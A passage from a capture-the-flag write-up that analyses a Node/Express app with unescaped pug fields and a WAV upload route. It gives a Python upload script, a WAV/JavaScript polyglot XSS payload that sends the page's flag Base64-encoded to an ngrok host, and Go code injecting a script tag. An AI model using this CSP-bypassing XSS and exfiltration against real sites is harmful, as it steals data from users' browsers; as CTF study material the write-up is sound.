</code></pre></div><p>Reading <a target="_blank" href="https://pugjs.org/language/interpolation.html#string-interpolation-unescaped"><code>pug</code> documentation</a> we can determine that <code>!{agent.hostname}</code>, <code>!{agent.platform}</code>, <code>!{agent.arch}</code> won&rsquo;t escape especial characters. Therefore, we will be able to inject HTML code and potentially perform XSS on the bot to read the flag from the DOM and send it back to a controlled server.</p><h3 id="file-upload-functionality">File upload functionality</h3><p>These are the routes available for an agent (<code>routes/agents.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">fs</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"fs"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"path"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> FileType </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"file-type"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">v4</span><span class="mtk1">: </span><span class="mtk8">uuidv4</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"uuid"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"express"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">Router</span><span class="mtk1">();</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">multer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"multer"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> {</span>
<span class="mtk1">  registerAgent,</span>
<span class="mtk1">  updateAgentDetails,</span>
<span class="mtk1">  createRecording,</span>
<span class="mtk1">} </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./../utils/database"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> authAgent </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"../middleware/authagent"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">storage</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">multer</span><span class="mtk1">.</span><span class="mtk8">diskStorage</span><span class="mtk1">({</span>
<span class="mtk1">  </span><span class="mtk8">filename</span><span class="mtk1">: (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">, </span><span class="mtk8">cb</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">cb</span><span class="mtk1">(</span><span class="mtk6">null</span><span class="mtk1">, </span><span class="mtk8">uuidv4</span><span class="mtk1">());</span>
<span class="mtk1">  },</span>
<span class="mtk1">  </span><span class="mtk8">destination</span><span class="mtk1">: (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">, </span><span class="mtk8">cb</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">cb</span><span class="mtk1">(</span><span class="mtk6">null</span><span class="mtk1">, </span><span class="mtk4">"./uploads"</span><span class="mtk1">);</span>
<span class="mtk1">  },</span>
<span class="mtk1">});</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">multerUpload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">multer</span><span class="mtk1">({</span>
<span class="mtk1">  </span><span class="mtk1">storage</span><span class="mtk1">: </span><span class="mtk1">storage</span><span class="mtk1">,</span>
<span class="mtk1">  </span><span class="mtk8">fileFilter</span><span class="mtk1">: (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">file</span><span class="mtk1">, </span><span class="mtk8">cb</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span>
<span class="mtk1">      </span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk1">mimetype</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"audio/wave"</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span>
<span class="mtk1">      </span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">extname</span><span class="mtk1">(</span><span class="mtk9 mtki">file</span><span class="mtk1">.</span><span class="mtk1">originalname</span><span class="mtk1">) </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">".wav"</span>
<span class="mtk1">    ) {</span>
<span class="mtk1">      </span><span class="mtk8">cb</span><span class="mtk1">(</span><span class="mtk6">null</span><span class="mtk1">, </span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">cb</span><span class="mtk1">(</span><span class="mtk6">null</span><span class="mtk1">, </span><span class="mtk6">false</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  },</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/agents/register"</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">200</span><span class="mtk1">).</span><span class="mtk8">json</span><span class="mtk1">(</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">registerAgent</span><span class="mtk1">());</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/agents/check/:identifier/:token"</span><span class="mtk1">, authAgent, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">sendStatus</span><span class="mtk1">(</span><span class="mtk6">200</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span>
<span class="mtk1">  </span><span class="mtk4">"/agents/details/:identifier/:token"</span><span class="mtk1">,</span>
<span class="mtk1">  authAgent,</span>
<span class="mtk1">  </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">hostname</span><span class="mtk1">, </span><span class="mtk1">platform</span><span class="mtk1">, </span><span class="mtk1">arch</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">hostname</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">platform</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">arch</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">sendStatus</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">updateAgentDetails</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">params</span><span class="mtk1">.identifier, </span><span class="mtk1">hostname</span><span class="mtk1">, </span><span class="mtk1">platform</span><span class="mtk1">, </span><span class="mtk1">arch</span><span class="mtk1">);</span>  
<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">sendStatus</span><span class="mtk1">(</span><span class="mtk6">200</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">);</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span>
<span class="mtk1">  </span><span class="mtk4">"/agents/upload/:identifier/:token"</span><span class="mtk1">,</span>
<span class="mtk1">  authAgent,</span>
<span class="mtk1">  </span><span class="mtk1">multerUpload</span><span class="mtk1">.</span><span class="mtk8">single</span><span class="mtk1">(</span><span class="mtk4">"recording"</span><span class="mtk1">),</span>
<span class="mtk1">  </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">file</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">sendStatus</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">filepath</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk4">"./uploads/"</span><span class="mtk1">, </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">file</span><span class="mtk1">.</span><span class="mtk1">filename</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">fileInfo</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> FileType.</span><span class="mtk8">fromFile</span><span class="mtk1">(</span><span class="mtk1">filepath</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">fileInfo</span><span class="mtk1">.ext </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'wav'</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">fs</span><span class="mtk1">.</span><span class="mtk8">unlinkSync</span><span class="mtk1">(</span><span class="mtk1">filepath</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">sendStatus</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">);</span>
<span class="mtk1">      }</span>
<span class="mtk1">      </span>
<span class="mtk1">      </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">createRecording</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">params</span><span class="mtk1">.identifier, </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">file</span><span class="mtk1">.</span><span class="mtk1">filename</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">file</span><span class="mtk1">.</span><span class="mtk1">filename</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">catch</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8 mtku">fs</span><span class="mtk1">.</span><span class="mtk8">unlinkSync</span><span class="mtk1">(</span><span class="mtk1">filepath</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">sendStatus</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>
<span class="mtk1">);</span>

<span class="mtk1">module</span><span class="mtk1">.</span><span class="mtk1">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">router</span><span class="mtk1">;</span>
</code></pre></div><p>The ones that are relevant are the POST endpoints. For instance, <code>/agents/details/:identifier/:token</code> allows us to set fields <code>hostname</code>, <code>platform</code> and <code>arch</code> (these were the fields that might allow us to perform XSS). On the other hand, <code>/agents/upload/:identifier/:token</code> will let us upload a WAV file. There are some checks applied on it:</p><ul><li>MIME type equal to <code>audio/wave</code></li><li>Filename extension <code>.wav</code></li><li>The file must be interpreted as a WAV file (magig bytes like: <code>RIFFAAAAWAVE</code>)</li></ul><p>There is a package named <a target="_blank" href="https://github.com/expressjs/multer"><code>multer</code></a> that will handle the file uploads, but there are no vulnerabilities, as far as I know. This package will save our uploaded file with a UUID as filename in <code>uploads/</code>.</p><h3 id="agent-analysis">Agent analysis</h3><p>Additionally, we are given an agent written in Go that performs these operations:</p><ul><li>Connect to the server and request credentials</li><li>Log in using the received credentials</li><li>Start recording and saving into a WAV file</li><li>Upload the WAV file</li></ul><p>The <code>main</code> function shows these flow:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">        </span><span class="mtk5">const</span><span class="mtk1"> configPath string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/tmp/spybug.conf"</span>
<span class="mtk1">        </span><span class="mtk5">const</span><span class="mtk1"> audioPath string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"rec.wav"</span>
<span class="mtk1">        </span><span class="mtk5">const</span><span class="mtk1"> apiURL string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk4 detected-link">http://127.0.0.1:1337</span><span class="mtk4">"</span>

<span class="mtk1">        </span><span class="mtk5">var</span><span class="mtk1"> apiConnection </span><span class="mtk7 mtki">bool</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">checkConnection</span><span class="mtk1">(apiURL)</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> apiConnection {</span>
<span class="mtk1">                </span><span class="mtk5">var</span><span class="mtk1"> configFileExists </span><span class="mtk7 mtki">bool</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">checkFile</span><span class="mtk1">(configPath)</span>

<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> configFileExists {</span>
<span class="mtk1">                        </span><span class="mtk5">var</span><span class="mtk1"> credentials []string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">readFromConfigFile</span><span class="mtk1">(configPath)</span>
<span class="mtk1">                        </span><span class="mtk5">var</span><span class="mtk1"> credsValidated </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">checkAgent</span><span class="mtk1">(apiURL, credentials[</span><span class="mtk6">0</span><span class="mtk1">], credentials[</span><span class="mtk6">1</span><span class="mtk1">])</span>

<span class="mtk1">                        </span><span class="mtk5">if</span><span class="mtk1"> credsValidated {</span>
<span class="mtk1">                                </span><span class="mtk7">updateDetails</span><span class="mtk1">(apiURL, credentials[</span><span class="mtk6">0</span><span class="mtk1">], credentials[</span><span class="mtk6">1</span><span class="mtk1">])</span>

<span class="mtk1">                                </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk5">range</span><span class="mtk1"> time.</span><span class="mtk7">NewTicker</span><span class="mtk1">(</span><span class="mtk6">30</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> time.Second).C {</span>
<span class="mtk1">                                        </span><span class="mtk7">recordingRoutine</span><span class="mtk1">(apiURL, credentials[</span><span class="mtk6">0</span><span class="mtk1">], credentials[</span><span class="mtk6">1</span><span class="mtk1">], audioPath)</span>  
<span class="mtk1">                                }</span>
<span class="mtk1">                        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk5">var</span><span class="mtk1"> newCredentials []string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">registerAgent</span><span class="mtk1">(apiURL)</span>
<span class="mtk1">                                </span><span class="mtk7">writeToConfigFile</span><span class="mtk1">(configPath, newCredentials[</span><span class="mtk6">0</span><span class="mtk1">], newCredentials[</span><span class="mtk6">1</span><span class="mtk1">])</span>
<span class="mtk1">                                </span><span class="mtk7">main</span><span class="mtk1">()</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk5">var</span><span class="mtk1"> newCredentials []string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">registerAgent</span><span class="mtk1">(apiURL)</span>
<span class="mtk1">                        </span><span class="mtk7">writeToConfigFile</span><span class="mtk1">(configPath, newCredentials[</span><span class="mtk6">0</span><span class="mtk1">], newCredentials[</span><span class="mtk6">1</span><span class="mtk1">])</span>
<span class="mtk1">                        </span><span class="mtk7">main</span><span class="mtk1">()</span>
<span class="mtk1">                }</span>
<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                time.</span><span class="mtk7">Sleep</span><span class="mtk1">(</span><span class="mtk6">30</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> time.Second)</span>
<span class="mtk1">                </span><span class="mtk7">main</span><span class="mtk1">()</span>
<span class="mtk1">        }</span>
<span class="mtk1">}</span>
</code></pre></div><p>The code is not supposed to be exploited. In fact, it looks like a helper script to try that CTF players use Go to solve the challenge.</p><h2 id="exploitation">Exploitation</h2><p>So, the idea is simple. We will use the agent program to create an agent and upload a malicious WAV file. This WAV file will contain the necessary characters to bypass <a target="_blank" href="https://github.com/expressjs/multer"><code>multer</code></a>&rsquo;s filters and some JavaScript payload in order to perform XSS. Remember that the CSP allows <code>script 'self'</code>, so we can use a <code>script</code> tag setting as <code>src</code> the path to the WAV file (indicating <code>type="text/javascript"</code> just in case).</p><p>At the begining, I started modifying the agent&rsquo;s code, but I didn&rsquo;t manage to upload the malicious WAV file correctly (probably because the MIME type was set automatically by Go). I had the same problem using <code>curl</code> and an HTML form. Finally, I got it to work using Python (obviously):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span>

<span class="mtk1">host</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]</span>

<span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'spybug.conf'</span><span class="mtk1">) </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">creds</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">read</span><span class="mtk1">().</span><span class="mtk8">replace</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">, </span><span class="mtk4">'/'</span><span class="mtk1">)</span>

<span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">'xss.wav'</span><span class="mtk1">) </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">wav</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">read</span><span class="mtk1">()</span>

<span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">host</span><span class="mtk6">}</span><span class="mtk4">/agents/upload/</span><span class="mtk6">{</span><span class="mtk1">creds</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk3"># proxies={'http': '</span><span class="mtk3 detected-link">http://127.0.0.1:8080</span><span class="mtk3">'},</span>
<span class="mtk1">        </span><span class="mtk9 mtki">files</span><span class="mtk5">=</span><span class="mtk1">{</span><span class="mtk4">'recording'</span><span class="mtk1">: (</span><span class="mtk4">'xss.wav'</span><span class="mtk1">, </span><span class="mtk1">wav</span><span class="mtk1">, </span><span class="mtk4">'audio/wave'</span><span class="mtk1">)})</span>  

<span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">r</span><span class="mtk1">.</span><span class="mtk1">text</span><span class="mtk1">)</span>
</code></pre></div><p>As can be seen in the comment, I debugged this part using Burp Suite and the Docker container to see the logs of the Express JS server.</p><p>The malicious WAV file is <code>xss.wav</code>, with the characters to bypass the RegEx an a simple XSS payload inside an image URL:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">RIFFAAAAWAVE <span class="mtk5">=</span> <span class="mtk6">0</span>;
<span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Image</span><span class="mtk1">()</span>
<span class="mtk1">i</span><span class="mtk1">.</span><span class="mtk1">src</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk4 detected-link">http://abcd-12-34-56-78.ngrok.io/</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7">btoa</span><span class="mtk1">(</span><span class="mtk1">document</span><span class="mtk1">.</span><span class="mtk8">querySelector</span><span class="mtk1">(</span><span class="mtk4">'h2'</span><span class="mtk1">).</span><span class="mtk1">textContent</span><span class="mtk1">)</span>  
<span class="mtk1">document</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><p>To find a payload that worked, I ran the server on my host machine (without Docker) and set <code>headless</code> to <code>false</code> in the <code>puppeteer</code> configuration in order to watch the bot interacting with the website in real-time. Moreover, the flag appears printed in the HTML code, inside an <code>h2</code> tag, that&rsquo;s why I use <code>document.querySelector</code> to find it and send it using Base64 encoding (<code>btoa</code>).</p><p>Notice that I was using <code>ngrok</code> to expose my local server to the internet:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ngrok</span> http 8000
<span class="code-cyan">ngrok</span>

<span class="code-dark-magenta">Add OAuth and webhook security to your ngrok (its free!): https://ngrok.com/free</span>

<span class="code-dark-green">Session Status                online</span>
<span class="code-white">Account                       Rocky (Plan: Free)</span>
<span class="code-white">Version                       3.2.1</span>
<span class="code-white">Region                        United States (us)</span>
<span class="code-white">Latency                       -</span>
<span class="code-white">Web Interface                 http://127.0.0.1:4040</span>
<span class="code-white">Forwarding                    https://abcd-12-34-56-78.ngrok.io -&gt; http://localhost:8000</span>  

<span class="code-white">Connections                   ttl     opn     rt1     rt5     p50     p90</span>
<span class="code-white">                              0       0       0.00    0.00    0.00    0.00</span>
</code></pre></div><p>Still, I used the Go script to request credentials and save them into <code>spybug.conf</code> and to modify one of the vulnerable parameters (<code>hostname</code>, <code>platform</code> or <code>arch</code>) to have the HTML code with the <code>script</code> tag pointing to the WAV file. These are the functions I modified:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// ...</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">updateDetails</span><span class="mtk1">(apiURL </span><span class="mtk7 mtki">string</span><span class="mtk1">, id </span><span class="mtk7 mtki">string</span><span class="mtk1">, token </span><span class="mtk7 mtki">string</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">var</span><span class="mtk1"> updateURL </span><span class="mtk7 mtki">string</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> apiURL </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">"/agents/details/"</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> id </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">"/"</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> token</span>

<span class="mtk1">        hostname, _ </span><span class="mtk5">:=</span><span class="mtk1"> os.</span><span class="mtk7">Hostname</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk5">var</span><span class="mtk1"> platform </span><span class="mtk7 mtki">string</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> runtime.GOOS</span>
<span class="mtk1">        </span><span class="mtk5">var</span><span class="mtk1"> arch </span><span class="mtk7 mtki">string</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> runtime.GOARCH</span>

<span class="mtk1">        hostname </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`&lt;script src="/uploads/`</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> os.Args[</span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">`" type="text/javascript"&gt;&lt;/script&gt;`</span>

<span class="mtk1">        requestBody, _ </span><span class="mtk5">:=</span><span class="mtk1"> json.</span><span class="mtk7">Marshal</span><span class="mtk1">(</span><span class="mtk5">map</span><span class="mtk1">[</span><span class="mtk7 mtki">string</span><span class="mtk1">]</span><span class="mtk7 mtki">string</span><span class="mtk1">{</span>
<span class="mtk1">                </span><span class="mtk4">"hostname"</span><span class="mtk1">: hostname,</span>
<span class="mtk1">                </span><span class="mtk4">"platform"</span><span class="mtk1">: platform,</span>
<span class="mtk1">                </span><span class="mtk4">"arch"</span><span class="mtk1">:     arch,</span>
<span class="mtk1">        })</span>

<span class="mtk1">        client </span><span class="mtk5">:=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">http.Client{}</span>
<span class="mtk1">        req, _ </span><span class="mtk5">:=</span><span class="mtk1"> http.</span><span class="mtk7">NewRequest</span><span class="mtk1">(</span><span class="mtk4">"POST"</span><span class="mtk1">, updateURL, bytes.</span><span class="mtk7">NewReader</span><span class="mtk1">(requestBody))</span>

<span class="mtk1">        req.Header.</span><span class="mtk7">Set</span><span class="mtk1">(</span><span class="mtk4">"Content-Type"</span><span class="mtk1">, </span><span class="mtk4">"application/json"</span><span class="mtk1">)</span>
<span class="mtk1">        resp, err </span><span class="mtk5">:=</span><span class="mtk1"> client.</span><span class="mtk7">Do</span><span class="mtk1">(req)</span>

